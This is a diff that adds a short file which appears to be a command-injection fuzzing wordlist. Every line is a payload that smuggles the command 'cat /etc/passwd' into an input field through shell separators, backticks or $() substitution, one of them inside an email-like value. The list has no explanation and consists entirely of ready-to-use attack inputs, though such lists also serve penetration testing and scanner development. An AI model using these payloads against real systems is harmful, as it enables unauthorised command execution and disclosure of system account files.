@@ -1,0 +1,15 @@
+;cat /etc/passwd
+|cat /etc/passwd
+||cat /etc/passwd
+&cat /etc/passwd
+&&cat /etc/passwd
+1;cat /etc/passwd
+1|cat /etc/passwd
+1||cat /etc/passwd
+1&cat /etc/passwd
+1&&cat /etc/passwd
+|| cat /etc/passwd ||
+& cat /etc/passwd &
+test@test.com||cat /etc/passwd||
+`cat /etc/passwd`
+$(cat /etc/passwd)
